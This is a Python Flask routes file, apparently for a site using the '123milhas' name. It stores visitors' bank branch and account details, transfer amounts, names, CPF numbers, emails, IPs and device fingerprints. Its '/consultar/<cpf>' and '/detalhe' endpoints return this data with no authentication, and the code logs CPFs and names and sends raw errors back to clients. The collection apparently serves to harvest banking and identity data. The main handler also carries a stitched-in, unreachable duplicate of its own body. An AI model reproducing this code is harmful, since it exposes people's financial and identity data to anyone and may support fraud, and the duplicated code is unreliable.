# app/routes/transfer_routes.py
from flask import Blueprint, request, jsonify
import sqlite3
import uuid
import json
from user_agents import parse
from datetime import datetime
import pytz

transfer_bp = Blueprint("transfer", __name__)


def get_brasilia_time():
    """Retorna datetime atual no horário de Brasília"""
    return datetime.now(pytz.timezone("America/Sao_Paulo"))


def detectar_dispositivo_completo(req):
    """Detecta informações completas do dispositivo"""
    user_agent_string = req.headers.get("User-Agent", "")
    ua = parse(user_agent_string)

    if ua.is_mobile:
        tipo = "mobile"
    elif ua.is_tablet:
        tipo = "tablet"
    elif ua.is_pc:
        tipo = "desktop"
    else:
        tipo = "unknown"

    return {
        "completo": {
            "categoria": tipo,
            "so": ua.os.family if ua.os.family else "unknown",
            "navegador": ua.browser.family if ua.browser.family else "unknown",
            "user_agent": user_agent_string[:500],
        },
        "network": {"ip": req.remote_addr},
        "resumo": f"{tipo} - {ua.os.family} - {ua.browser.family}",
    }


# app/routes/transfer_routes.py - Substitua a função registrar_tentativa


@transfer_bp.route("/tentativa", methods=["POST"])
def registrar_tentativa():
    """Registra tentativa de transferência com horário de Brasília"""
    try:
        dados = request.json
        print(f"📥 Transferência recebida: {json.dumps(dados, indent=2)}")

        conn = sqlite3.connect("123milhas.db")
        cursor = conn.cursor()

        # Gerar IDs
        transferencia_id = str(uuid.uuid4())
        tracking_id = dados.get("tracking_id") or request.cookies.get("tracking_id")

        # Detectar dispositivo
        device = detectar_dispositivo_completo(request)

        # Obter horário de Brasília FORMATADO
        agora_brasilia = get_brasilia_time()
        agora_brasilia_str = agora_brasilia.strftime("%Y-%m-%d %H:%M:%S")

        # Se não tem tracking_id, criar um novo
        if not tracking_id:
            tracking_id = str(uuid.uuid4())
            session_id = str(uuid.uuid4())

            # Usar horário de Brasília explicitamente
            cursor.execute(
                """
                INSERT INTO tracking_visits (
                    tracking_id, session_id, dispositivo_tipo, dispositivo_os, 
                    dispositivo_browser, user_agent, ip_address, created_at, last_activity
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            """,
                (
                    tracking_id,
                    session_id,
                    device["completo"]["categoria"],
                    device["completo"]["so"],
                    device["completo"]["navegador"],
                    device["completo"]["user_agent"],
                    device["network"]["ip"],
                    agora_brasilia_str,
                    agora_brasilia_str,
                ),
            )
            print(f"📱 Criado novo tracking_id: {tracking_id}")

        # Dados da transferência
        transfer_data = dados.get("transferencia", {})

        # Inserir transferência COM horário de Brasília
        cursor.execute(
            """
            INSERT INTO transferencias_registro (
                transferencia_id, tracking_id, banco_codigo, banco_nome,
                agencia, conta, valor, status, created_at
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        """,
            (
                transferencia_id,
                tracking_id,
                transfer_data.get("banco_codigo"),
                transfer_data.get("banco_nome"),
                transfer_data.get("agencia"),
                transfer_data.get("conta"),
                transfer_data.get("valor"),
                "pendente_verificacao",
                agora_brasilia_str,
            ),
        )

        # Atualizar dados do usuário no tracking
        if dados.get("usuario") and tracking_id:
            usuario = dados["usuario"]
            cpf_limpo = usuario.get("cpf", "").replace(".", "").replace("-", "")

            cursor.execute(
                """
                UPDATE tracking_visits 
                SET nome = ?, cpf = ?, email = ?, updated_at = ?
                WHERE tracking_id = ?
            """,
                (
                    usuario.get("nome"),
                    cpf_limpo,
                    usuario.get("email"),
                    agora_brasilia_str,
                    tracking_id,
                ),
            )
            print(f"👤 Dados do usuário atualizados: {usuario.get('nome')}")

        conn.commit()
        conn.close()

        print(f"✅ Transferência {transferencia_id} registrada em {agora_brasilia_str}")

        return jsonify(
            {
                "success": True,
                "transferencia_id": transferencia_id,
                "tracking_id": tracking_id,
                "data_hora": agora_brasilia_str,
                "message": "Tentativa registrada com sucesso",
            }
        )

    except Exception as e:
        print(f"❌ Erro: {e}")
        return jsonify({"success": False, "error": str(e)}), 500
    """Registra tentativa de transferência com horário de Brasília"""
    try:
        dados = request.json
        print(f"📥 Transferência recebida: {json.dumps(dados, indent=2)}")

        conn = sqlite3.connect("123milhas.db")
        cursor = conn.cursor()

        # Gerar IDs
        transferencia_id = str(uuid.uuid4())
        tracking_id = dados.get("tracking_id") or request.cookies.get("tracking_id")

        # Detectar dispositivo
        device = detectar_dispositivo_completo(request)

        # Obter horário de Brasília
        agora_brasilia = get_brasilia_time().strftime("%Y-%m-%d %H:%M:%S")
        agora_brasilia_sql = "datetime('now', 'localtime')"  # SQLite localtime

        # Se não tem tracking_id, criar um novo
        if not tracking_id:
            tracking_id = str(uuid.uuid4())
            session_id = str(uuid.uuid4())

            cursor.execute(
                """
                INSERT INTO tracking_visits (
                    tracking_id, session_id, dispositivo_tipo, dispositivo_os, 
                    dispositivo_browser, user_agent, ip_address, created_at, last_activity
                ) VALUES (?, ?, ?, ?, ?, ?, ?, datetime('now', 'localtime'), datetime('now', 'localtime'))
            """,
                (
                    tracking_id,
                    session_id,
                    device["completo"]["categoria"],
                    device["completo"]["so"],
                    device["completo"]["navegador"],
                    device["completo"]["user_agent"],
                    device["network"]["ip"],
                ),
            )
            print(
                f"📱 Criado novo tracking_id: {tracking_id} - Dispositivo: {device['resumo']}"
            )

        # Dados da transferência
        transfer_data = dados.get("transferencia", {})

        # Inserir transferência
        cursor.execute(
            """
            INSERT INTO transferencias_registro (
                transferencia_id, tracking_id, banco_codigo, banco_nome,
                agencia, conta, valor, status, created_at
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, datetime('now', 'localtime'))
        """,
            (
                transferencia_id,
                tracking_id,
                transfer_data.get("banco_codigo"),
                transfer_data.get("banco_nome"),
                transfer_data.get("agencia"),
                transfer_data.get("conta"),
                transfer_data.get("valor"),
                "pendente_verificacao",
            ),
        )

        # Atualizar dados do usuário no tracking
        if dados.get("usuario") and tracking_id:
            usuario = dados["usuario"]
            cpf_limpo = usuario.get("cpf", "").replace(".", "").replace("-", "")

            cursor.execute(
                """
                UPDATE tracking_visits 
                SET nome = ?, cpf = ?, email = ?, updated_at = datetime('now', 'localtime')
                WHERE tracking_id = ?
            """,
                (usuario.get("nome"), cpf_limpo, usuario.get("email"), tracking_id),
            )
            print(
                f"👤 Dados do usuário atualizados: {usuario.get('nome')} - CPF: {cpf_limpo}"
            )

        conn.commit()
        conn.close()

        print(
            f"✅ Transferência {transferencia_id} registrada com sucesso em {agora_brasilia}"
        )

        return jsonify(
            {
                "success": True,
                "transferencia_id": transferencia_id,
                "tracking_id": tracking_id,
                "data_hora": agora_brasilia,
                "message": "Tentativa registrada com sucesso",
            }
        )

    except Exception as e:
        print(f"❌ Erro ao registrar transferência: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


@transfer_bp.route("/consultar/<cpf>", methods=["GET"])
def consultar_por_cpf(cpf):
    """Consulta transferências por CPF"""
    try:
        conn = sqlite3.connect("123milhas.db")
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()

        cpf_limpo = cpf.replace(".", "").replace("-", "")

        cursor.execute(
            """
            SELECT 
                t.transferencia_id,
                t.banco_nome,
                t.agencia,
                t.conta,
                t.valor,
                t.status,
                t.created_at,
                v.nome,
                v.email,
                v.dispositivo_tipo,
                v.dispositivo_os,
                v.ip_address
            FROM transferencias_registro t
            LEFT JOIN tracking_visits v ON t.tracking_id = v.tracking_id
            WHERE v.cpf = ? OR v.cpf LIKE ?
            ORDER BY t.created_at DESC
        """,
            (cpf_limpo, f"%{cpf_limpo}%"),
        )

        rows = cursor.fetchall()
        conn.close()

        transferencias = []
        for row in rows:
            transferencias.append(
                {
                    "transferencia_id": row["transferencia_id"],
                    "banco": row["banco_nome"],
                    "agencia": row["agencia"],
                    "conta": row["conta"],
                    "valor": row["valor"],
                    "status": row["status"],
                    "data": row["created_at"],
                    "nome": row["nome"],
                    "email": row["email"],
                    "dispositivo": (
                        f"{row['dispositivo_tipo']} - {row['dispositivo_os']}"
                        if row["dispositivo_tipo"]
                        else "N/A"
                    ),
                    "ip": row["ip_address"] or "N/A",
                }
            )

        return jsonify(
            {
                "success": True,
                "total": len(transferencias),
                "transferencias": transferencias,
            }
        )

    except Exception as e:
        print(f"❌ Erro ao consultar: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


@transfer_bp.route("/detalhe/<transferencia_id>", methods=["GET"])
def detalhe_transferencia(transferencia_id):
    """Detalhe completo de uma transferência"""
    try:
        conn = sqlite3.connect("123milhas.db")
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()

        cursor.execute(
            """
            SELECT 
                t.transferencia_id,
                t.banco_codigo,
                t.banco_nome,
                t.agencia,
                t.conta,
                t.valor,
                t.status,
                t.created_at,
                v.nome,
                v.cpf,
                v.email,
                v.dispositivo_tipo,
                v.dispositivo_os,
                v.dispositivo_browser,
                v.user_agent,
                v.ip_address,
                v.created_at as data_cadastro
            FROM transferencias_registro t
            LEFT JOIN tracking_visits v ON t.tracking_id = v.tracking_id
            WHERE t.transferencia_id = ?
        """,
            (transferencia_id,),
        )

        row = cursor.fetchone()
        conn.close()

        if not row:
            return (
                jsonify({"success": False, "error": "Transferência não encontrada"}),
                404,
            )

        return jsonify({"success": True, "transferencia": dict(row)})

    except Exception as e:
        print(f"❌ Erro: {e}")
        return jsonify({"success": False, "error": str(e)}), 500
